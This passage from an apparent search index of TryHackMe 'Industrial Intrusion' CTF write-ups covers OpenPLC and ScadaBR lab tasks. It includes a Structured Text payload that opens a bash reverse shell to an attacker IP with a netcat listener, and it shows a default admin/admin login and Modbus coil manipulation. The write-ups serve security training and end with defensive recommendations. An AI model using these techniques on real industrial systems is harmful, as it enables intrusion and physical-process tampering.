(Unverified)"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#41-final-st-payload","text":"PROGRAM main VAR x : BOOL; END_VAR x := __SysCmd('bash -c \"bash -i >& /dev/tcp/10.10.17.195/9001 0>&1\"'); Note: Replace 10.10.17.195 with the actual attacker's IP and ensure a listener is running: nc -lvnp 9001","title":"4.1 Final ST Payload"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#42-execution-steps","text":"Go to Programs > Create New Program Paste the payload and save Click Compile \u2013 this now succeeds under Python runtime Click Start PLC \u2013 this executes the payload","title":"4.2 Execution Steps"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#phase-5-shell-access-and-flag-retrieval-tentative","text":"Once the program was executed, a reverse shell was established. From the shell, the second flag was retrieved using: cat /home/ubuntu/ubuntu_flag.txt","title":"Phase 5: Shell Access and Flag Retrieval (Tentative)"},{"location":"industrial-intrusion-tryhackme/Task%208%20-%20Kaboom/#summary","text":"This assessment highlights key vulnerabilities in the OpenPLC setup: Default credentials granting access to PLC logic Unrestricted hardware configuration exposing arbitrary command execution paths No execution sandboxing , allowing system-level shell commands from control logic Recommendations: Disable or tightly restrict __SysCmd() functionality Remove or secure default credentials Limit runtime environments to safe, non-executing targets (e.g., simulator only) Monitor for unauthorized PLC configuration changes Enforce network segmentation to isolate PLC interfaces from attacker reach Note: This exploitation path is tentative until validated in the original CTF environment, as the user no longer has access to verify successful shell establishment.","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/","text":"ICS Security Assessment \u2013 Task 9: Industrial Intrusion Executive Summary The Virelia facility\u2019s legacy tank-control system exhibited unauthorized valve toggling and inconsistent tank fill levels. After gaining access to the ScadaBR interface via default credentials, further investigation revealed a Modbus TCP data source configured to communicate with a PLC on port 5020. A writable coil labeled test was found and manipulated to trigger hidden control logic. A scan of holding registers subsequently revealed a plaintext flag embedded in Modbus memory. Phase 1: Comprehensive Reconnaissance A full port scan was conducted to uncover exposed services on the target system. 1.1 Port Scan Command nmap -p- -T4 -v 10.10.181.88 1.2 Discovered Services Port Service Details 22/tcp SSH Open, but unused in this assessment 80/tcp HTTP No relevant content 8080/tcp HTTP Hosted ScadaBR HMI system 5020/tcp Modbus-like Used by PLC for Modbus TCP communications 5901/tcp VNC Present, but not required for exploitation Phase 2: Gaining Access to the HMI Accessing http://10.10.181.88:8080 revealed a ScadaBR login page. The system was vulnerable to default credentials. 2.1 Login Success Username: admin Password: admin This granted full administrative access to the ScadaBR environment. 2.2 Data Source Analysis Under the \"Data Sources\" panel, a Modbus IP connection named secret was configured to poll a slave device on port 5020 , slave ID 1 . A single point named test was configured but disabled. Phase 3: Exploitation via Coil Manipulation The point test was modified to use Coil status with offset 0 and made settable. Once enabled, it was added to the Watch List and toggled from 0 to 1 , presumably activating back-end control logic. 3.1 Confirming the Toggle secret - test = 1 This change was reflected in the event history, confirming successful coil write via the GUI. Phase 4: Retrieving the Flag from Holding Registers With the logic armed, a scan of the Modbus holding registers was performed using the ScadaBR interface. 4.1 Holding Register Dump 0 ==> 0054 1 ==> 0048 2 ==> 004D 3 ==> 007B 4 ==> 006D 5 ==> 006F 6 ==> 0064 7 ==> 0062 8 ==> 0075 9 ==> 0073 10 ==> 005F 11 ==> 0068 12 ==> 0069 13 ==> 0064 14 ==> 007D These values translate from hex to ASCII as: THM{modbus_hid} Summary This assessment uncovered weak authentication practices, insecure Modbus coil exposure, and unsegmented ICS assets vulnerable to remote manipulation. Flag Obtained: THM{modbus_hid} Recommendations: Replace default HMI credentials and enforce strong password policies Implement network segmentation between ICS and corporate environments Restrict Modbus write permissions to authorized controllers Monitor and log all industrial protocol traffic for anomaly detection","title":"Task 9 - Brr v2"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#ics-security-assessment-task-9-industrial-intrusion","text":"","title":"ICS Security Assessment \u2013 Task 9: Industrial Intrusion"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#executive-summary","text":"The Virelia facility\u2019s legacy tank-control system exhibited unauthorized valve toggling and inconsistent tank fill levels. After gaining access to the ScadaBR interface via default credentials, further investigation revealed a Modbus TCP data source configured to communicate with a PLC on port 5020. A writable coil labeled test was found and manipulated to trigger hidden control logic. A scan of holding registers subsequently revealed a plaintext flag embedded in Modbus memory.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#phase-1-comprehensive-reconnaissance","text":"A full port scan was conducted to uncover exposed services on the target system.","title":"Phase 1: Comprehensive Reconnaissance"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#11-port-scan-command","text":"nmap -p- -T4 -v 10.10.181.88","title":"1.1 Port Scan Command"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#12-discovered-services","text":"Port Service Details 22/tcp SSH Open, but unused in this assessment 80/tcp HTTP No relevant content 8080/tcp HTTP Hosted ScadaBR HMI system 5020/tcp Modbus-like Used by PLC for Modbus TCP communications 5901/tcp VNC Present, but not required for exploitation","title":"1.2 Discovered Services"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#phase-2-gaining-access-to-the-hmi","text":"Accessing http://10.10.181.88:8080 revealed a ScadaBR login page. The system was vulnerable to default credentials.","title":"Phase 2: Gaining Access to the HMI"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#21-login-success","text":"Username: admin Password: admin This granted full administrative access to the ScadaBR environment.","title":"2.1 Login Success"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#22-data-source-analysis","text":"Under the \"Data Sources\" panel, a Modbus IP connection named secret was configured to poll a slave device on port 5020 , slave ID 1 . A single point named test was configured but disabled.","title":"2.2 Data Source Analysis"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#phase-3-exploitation-via-coil-manipulation","text":"The point test was modified to use Coil status with offset 0 and made settable. Once enabled, it was added to the Watch List and toggled from 0 to 1 , presumably activating back-end control logic.","title":"Phase 3: Exploitation via Coil Manipulation"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#31-confirming-the-toggle","text":"secret - test = 1 This change was reflected in the event history, confirming successful coil write via the GUI.","title":"3.1 Confirming the Toggle"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#phase-4-retrieving-the-flag-from-holding-registers","text":"With the logic armed, a scan of the Modbus holding registers was performed using the ScadaBR interface.","title":"Phase 4: Retrieving the Flag from Holding Registers"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#41-holding-register-dump","text":"0 ==> 0054 1 ==> 0048 2 ==> 004D 3 ==> 007B 4 ==> 006D 5 ==> 006F 6 ==> 0064 7 ==> 0062 8 ==> 0075 9 ==> 0073 10 ==> 005F 11 ==> 0068 12 ==> 0069 13 ==> 0064 14 ==> 007D These values translate from hex to ASCII as: THM{modbus_hid}","title":"4.1 Holding Register Dump"},{"location":"industrial-intrusion-tryhackme/Task%209%20-%20Brr%20v2/#summary","text":"This assessment uncovered weak authentication practices, insecure Modbus coil exposure, and unsegmented ICS assets vulnerable to remote manipulation. Flag Obtained: THM{modbus_hid} Recommendations: Replace default HMI credentials and enforce strong password policies Implement network segmentation between ICS and corporate environments Restrict Modbus write permissions to authorized controllers Monitor and log all industrial protocol traffic for anomaly detection","title":"Summary"},{"location":"industrial-intrusion-tryhackme/zTask%2019%20-%20No%20Salt%20No%20Shame/","text":"Person never wrote documentation","title":"zTask 19   No Salt No Shame"},{"location":"industrial-intrusion-tryhackme/zTask%2020%20-%20Echoed%20Streams/","text":"Person never wrote documentation","title":"zTask 20   Echoed Streams"},{"location":"industrial-intrusion-tryhackme/zTask%2023%20-%20Register%20Sweet/","text":"Person did not write up documentation","title":"zTask 23   Register Sweet"}]}